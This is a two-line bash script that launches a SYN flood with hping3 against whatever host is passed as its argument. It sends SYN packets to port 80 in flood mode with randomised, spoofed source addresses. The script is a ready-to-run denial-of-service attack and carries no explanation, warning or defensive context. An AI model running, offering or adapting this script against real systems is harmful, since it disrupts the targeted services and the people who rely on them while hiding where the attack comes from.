#!/bin/bash
sudo hping3 -S -p 80 --rand-source --flood "$1"
